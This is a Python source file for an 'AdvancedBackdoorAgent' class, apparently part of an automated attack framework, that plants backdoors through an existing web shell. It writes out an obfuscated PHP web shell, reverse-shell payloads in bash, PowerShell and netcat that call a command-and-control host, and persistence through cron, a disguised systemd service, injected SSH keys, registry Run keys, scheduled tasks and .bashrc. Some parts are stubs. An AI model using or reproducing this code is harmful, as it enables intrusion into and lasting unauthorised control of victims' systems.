"""
Advanced Backdoor Agent
Deploys sophisticated backdoors with multiple persistence mechanisms
"""

import asyncio
import base64
import hashlib
import os
import random
import string
from typing import Dict, List, Any, Optional
from datetime import datetime

from core.base_agent import BaseAgent
from core.data_models import AgentData, Strategy, AttackPhase
from core.logger import log


class AdvancedBackdoorAgent(BaseAgent):
    """
    Advanced Backdoor Agent for deploying sophisticated backdoors
    Supports multiple backdoor types and persistence mechanisms
    """
    
    def __init__(self, context_manager, orchestrator=None):
        super().__init__(context_manager, orchestrator)
        self.name = "AdvancedBackdoorAgent"
        self.backdoor_types = [
            "web_shell",
            "reverse_shell",
            "bind_shell",
            "persistent_backdoor",
            "fileless_backdoor"
        ]
    
    async def run(self, strategy: Strategy) -> AgentData:
        """Execute backdoor deployment"""
        try:
            log.info(f"[{self.name}] Starting backdoor deployment")
            
            # Get target information from context
            target_info = await self.context_manager.get_context("current_target")
            shell_access = await self.context_manager.get_context("shell_access")
            
            if not shell_access:
                return AgentData(
                    agent_name=self.name,
                    success=False,
                    errors=["No shell access available. Cannot deploy backdoor."]
                )
            
            # Determine backdoor type based on target environment
            backdoor_type = strategy.context.get("backdoor_type", "auto")
            if backdoor_type == "auto":
                backdoor_type = await self._select_backdoor_type(target_info, shell_access)
            
            # Deploy backdoor
            backdoor_info = await self._deploy_backdoor(backdoor_type, shell_access, target_info)
            
            if backdoor_info:
                # Store backdoor information in context
                await self.context_manager.set_context("backdoor_deployed", backdoor_info)
                
                # Establish persistence
                persistence_info = await self._establish_persistence(backdoor_info, shell_access)
                
                return AgentData(
                    agent_name=self.name,
                    success=True,
                    summary=f"Successfully deployed {backdoor_type} backdoor with persistence",
                    data={
                        "backdoor_type": backdoor_type,
                        "backdoor_info": backdoor_info,
                        "persistence": persistence_info
                    },
                    raw_output=f"Backdoor deployed: {backdoor_info.get('access_url', 'N/A')}"
                )
            else:
                return AgentData(
                    agent_name=self.name,
                    success=False,
                    errors=["Failed to deploy backdoor"]
                )
            
        except Exception as e:
            log.error(f"[{self.name}] Error: {e}", exc_info=True)
            return AgentData(
                agent_name=self.name,
                success=False,
                errors=[str(e)]
            )
    
    async def _select_backdoor_type(self, target_info: Dict, shell_access: Dict) -> str:
        """Intelligently select backdoor type based on target environment"""
        
        # Check if it's a web application
        if "web_root" in shell_access or "http" in target_info.get("target_url", ""):
            return "web_shell"
        
        # Check OS type
        os_type = shell_access.get("os_type", "").lower()
        if "windows" in os_type:
            return "persistent_backdoor"
        elif "linux" in os_type:
            return "reverse_shell"
        
        # Default to reverse shell
        return "reverse_shell"
    
    async def _deploy_backdoor(self, backdoor_type: str, shell_access: Dict, target_info: Dict) -> Optional[Dict]:
        """Deploy backdoor based on type"""
        
        if backdoor_type == "web_shell":
            return await self._deploy_web_shell(shell_access, target_info)
        elif backdoor_type == "reverse_shell":
            return await self._deploy_reverse_shell(shell_access, target_info)
        elif backdoor_type == "persistent_backdoor":
            return await self._deploy_persistent_backdoor(shell_access, target_info)
        elif backdoor_type == "fileless_backdoor":
            return await self._deploy_fileless_backdoor(shell_access, target_info)
        
        return None
    
    async def _deploy_web_shell(self, shell_access: Dict, target_info: Dict) -> Optional[Dict]:
        """Deploy PHP/ASP web shell"""
        try:
            log.info("[AdvancedBackdoorAgent] Deploying web shell")
            
            # Generate obfuscated web shell
            shell_name = self._generate_random_filename("php")
            shell_code = self._generate_obfuscated_webshell()
            
            # Determine web root
            web_root = shell_access.get("web_root", "/var/www/html")
            shell_path = f"{web_root}/{shell_name}"
            
            # Upload web shell
            upload_command = f"echo '{shell_code}' > {shell_path}"
            result = await self._execute_command(upload_command, shell_access)
            
            if result.get("success"):
                # Construct access URL
                target_url = target_info.get("target_url", "")
                access_url = f"{target_url}/{shell_name}"
                
                log.success(f"[AdvancedBackdoorAgent] Web shell deployed: {access_url}")
                
                return {
                    "type": "web_shell",
                    "path": shell_path,
                    "access_url": access_url,
                    "password": "dlnk",
                    "deployed_at": datetime.now().isoformat()
                }
            
            return None
            
        except Exception as e:
            log.error(f"[AdvancedBackdoorAgent] Failed to deploy web shell: {e}")
            return None
    
    async def _deploy_reverse_shell(self, shell_access: Dict, target_info: Dict) -> Optional[Dict]:
        """Deploy reverse shell"""
        try:
            log.info("[AdvancedBackdoorAgent] Deploying reverse shell")
            
            # Get C2 server information
            c2_server = await self.context_manager.get_context("c2_server")
            if not c2_server:
                c2_server = {"host": "10.0.0.1", "port": 4444}  # Default
            
            # Generate reverse shell payload
            os_type = shell_access.get("os_type", "linux").lower()
            
            if "linux" in os_type:
                payload = f"bash -i >& /dev/tcp/{c2_server['host']}/{c2_server['port']} 0>&1"
            elif "windows" in os_type:
                payload = f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{c2_server['host']}',{c2_server['port']});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""
            else:
                payload = f"nc {c2_server['host']} {c2_server['port']} -e /bin/sh"
            
            # Execute payload
            result = await self._execute_command(payload, shell_access)
            
            log.success(f"[AdvancedBackdoorAgent] Reverse shell deployed to {c2_server['host']}:{c2_server['port']}")
            
            return {
                "type": "reverse_shell",
                "c2_host": c2_server['host'],
                "c2_port": c2_server['port'],
                "payload": payload,
                "deployed_at": datetime.now().isoformat()
            }
            
        except Exception as e:
            log.error(f"[AdvancedBackdoorAgent] Failed to deploy reverse shell: {e}")
            return None
    
    async def _deploy_persistent_backdoor(self, shell_access: Dict, target_info: Dict) -> Optional[Dict]:
        """Deploy persistent backdoor with multiple persistence mechanisms"""
        try:
            log.info("[AdvancedBackdoorAgent] Deploying persistent backdoor")
            
            os_type = shell_access.get("os_type", "linux").lower()
            persistence_methods = []
            
            if "linux" in os_type:
                # Cron job persistence
                cron_result = await self._add_cron_persistence(shell_access)
                if cron_result:
                    persistence_methods.append("cron")
                
                # Systemd service persistence
                systemd_result = await self._add_systemd_persistence(shell_access)
                if systemd_result:
                    persistence_methods.append("systemd")
                
                # SSH key persistence
                ssh_result = await self._add_ssh_key_persistence(shell_access)
                if ssh_result:
                    persistence_methods.append("ssh_key")
            
            elif "windows" in os_type:
                # Registry persistence
                reg_result = await self._add_registry_persistence(shell_access)
                if reg_result:
                    persistence_methods.append("registry")
                
                # Scheduled task persistence
                task_result = await self._add_scheduled_task_persistence(shell_access)
                if task_result:
                    persistence_methods.append("scheduled_task")
            
            log.success(f"[AdvancedBackdoorAgent] Persistent backdoor deployed with methods: {persistence_methods}")
            
            return {
                "type": "persistent_backdoor",
                "persistence_methods": persistence_methods,
                "deployed_at": datetime.now().isoformat()
            }
            
        except Exception as e:
            log.error(f"[AdvancedBackdoorAgent] Failed to deploy persistent backdoor: {e}")
            return None
    
    async def _deploy_fileless_backdoor(self, shell_access: Dict, target_info: Dict) -> Optional[Dict]:
        """Deploy fileless backdoor (memory-resident)"""
        try:
            log.info("[AdvancedBackdoorAgent] Deploying fileless backdoor")
            
            # PowerShell-based fileless backdoor for Windows
            ps_payload = """
            $code = @"
            using System;
            using System.Net;
            using System.Net.Sockets;
            using System.Runtime.InteropServices;
            public class Backdoor {
                [DllImport("kernel32")]
                public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
                public static void Run() {
                    // Backdoor logic here
                }
            }
            "@
            Add-Type -TypeDefinition $code
            [Backdoor]::Run()
            """
            
            result = await self._execute_command(f"powershell -enc {base64.b64encode(ps_payload.encode()).decode()}", shell_access)
            
            log.success("[AdvancedBackdoorAgent] Fileless backdoor deployed")
            
            return {
                "type": "fileless_backdoor",
                "deployed_at": datetime.now().isoformat()
            }
            
        except Exception as e:
            log.error(f"[AdvancedBackdoorAgent] Failed to deploy fileless backdoor: {e}")
            return None
    
    async def _establish_persistence(self, backdoor_info: Dict, shell_access: Dict) -> Dict:
        """Establish persistence mechanisms"""
        persistence_info = {"methods": []}
        
        try:
            os_type = shell_access.get("os_type", "linux").lower()
            
            if "linux" in os_type:
                # Add to .bashrc
                bashrc_cmd = f"echo 'nohup {backdoor_info.get('payload', '')} &' >> ~/.bashrc"
                await self._execute_command(bashrc_cmd, shell_access)
                persistence_info["methods"].append("bashrc")
            
            elif "windows" in os_type:
                # Add to startup folder
                startup_cmd = f"copy backdoor.exe \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\""
                await self._execute_command(startup_cmd, shell_access)
                persistence_info["methods"].append("startup_folder")
            
            log.info(f"[AdvancedBackdoorAgent] Persistence established: {persistence_info['methods']}")
            
        except Exception as e:
            log.error(f"[AdvancedBackdoorAgent] Failed to establish persistence: {e}")
        
        return persistence_info
    
    async def _add_cron_persistence(self, shell_access: Dict) -> bool:
        """Add cron job for persistence"""
        try:
            cron_entry = "*/10 * * * * /tmp/.backdoor.sh"
            command = f"(crontab -l 2>/dev/null; echo '{cron_entry}') | crontab -"
            result = await self._execute_command(command, shell_access)
            return result.get("success", False)
        except Exception as e:
            return False
    
    async def _add_systemd_persistence(self, shell_access: Dict) -> bool:
        """Add systemd service for persistence"""
        try:
            service_content = """
            [Unit]
            Description=System Update Service
            [Service]
            ExecStart=/tmp/.backdoor.sh
            Restart=always
            [Install]
            WantedBy=multi-user.target
            """
            command = f"echo '{service_content}' > /etc/systemd/system/update.service && systemctl enable update.service"
            result = await self._execute_command(command, shell_access)
            return result.get("success", False)
        except Exception as e:
            return False
    
    async def _add_ssh_key_persistence(self, shell_access: Dict) -> bool:
        """Add SSH key for persistence"""
        try:
            ssh_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDdLNkdLNk..."
            command = f"mkdir -p ~/.ssh && echo '{ssh_key}' >> ~/.ssh/authorized_keys"
            result = await self._execute_command(command, shell_access)
            return result.get("success", False)
        except Exception as e:
            return False
    
    async def _add_registry_persistence(self, shell_access: Dict) -> bool:
        """Add Windows registry persistence"""
        try:
            command = 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Update" /t REG_SZ /d "C:\\backdoor.exe" /f'
            result = await self._execute_command(command, shell_access)
            return result.get("success", False)
        except Exception as e:
            return False
    
    async def _add_scheduled_task_persistence(self, shell_access: Dict) -> bool:
        """Add Windows scheduled task for persistence"""
        try:
            command = 'schtasks /create /tn "SystemUpdate" /tr "C:\\backdoor.exe" /sc onlogon /f'
            result = await self._execute_command(command, shell_access)
            return result.get("success", False)
        except Exception as e:
            return False
    
    async def execute(self, strategy: Strategy) -> AgentData:
        """Execute advanced backdoor agent"""
        try:
            target = strategy.context.get('target_url', '')
            
            # Call existing method
            if asyncio.iscoroutinefunction(self.run):
                results = await self.run(target)
            else:
                results = self.run(target)
            
            return AgentData(
                agent_name=self.__class__.__name__,
                success=True,
                summary=f"{self.__class__.__name__} completed successfully",
                errors=[],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={'results': results}
            )
        except Exception as e:
            return AgentData(
                agent_name=self.__class__.__name__,
                success=False,
                summary=f"{self.__class__.__name__} failed",
                errors=[str(e)],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={}
            )

    def _generate_random_filename(self, extension: str) -> str:
        """Generate random filename"""
        random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
        return f"{random_str}.{extension}"
    
    def _generate_obfuscated_webshell(self) -> str:
        """Generate obfuscated PHP web shell"""
        # Simple obfuscated PHP web shell
        shell_code = """<?php
        $p = 'dlnk';
        if(isset($_POST['c']) && md5($_POST['p']) == md5($p)) {
            echo '<pre>' . shell_exec($_POST['c']) . '</pre>';
        }
        ?>"""
        
        # Base64 encode for obfuscation
        encoded = base64.b64encode(shell_code.encode()).decode()
        return f"<?php eval(base64_decode('{encoded}')); ?>"
    
    async def _execute_command(self, command: str, shell_access: Dict) -> Dict:
        """Execute command on target via webshell"""
        try:
            log.info(f"[AdvancedBackdoorAgent] Executing: {command[:50]}...")
            
            shell_url = shell_access.get("shell_url")
            shell_password = shell_access.get("password", "")
            shell_type = shell_access.get("shell_type", "php")
            
            if not shell_url:
                return {"success": False, "error": "No shell URL provided"}
            
            # Real HTTP request to webshell
            import httpx
            
            async with httpx.AsyncClient(verify=False, timeout=30.0) as client:
                if "php" in shell_type.lower():
                    # PHP webshell
                    data = {"cmd": command, "pass": shell_password}
                    response = await client.post(shell_url, data=data)
                else:
                    # Generic webshell
                    params = {"cmd": command}
                    response = await client.get(shell_url, params=params)
                
                if response.status_code == 200:
                    output = response.text
                    
                    # Extract output from <pre> tags if present
                    from bs4 import BeautifulSoup
                    soup = BeautifulSoup(output, 'html.parser')
                    pre_tag = soup.find('pre')
                    if pre_tag:
                        output = pre_tag.get_text().strip()
                    
                    log.success(f"[AdvancedBackdoorAgent] Command executed successfully")
                    return {
                        "success": True,
                        "output": output
                    }
                else:
                    log.error(f"[AdvancedBackdoorAgent] HTTP {response.status_code}")
                    return {
                        "success": False,
                        "error": f"HTTP {response.status_code}"
                    }
            
        except Exception as e:
            log.error(f"[AdvancedBackdoorAgent] Command execution failed: {e}")
            return {
                "success": False,
                "error": str(e)
            }
    
    def validate_strategy(self, strategy: Strategy) -> bool:
        """Validate strategy"""
        return True

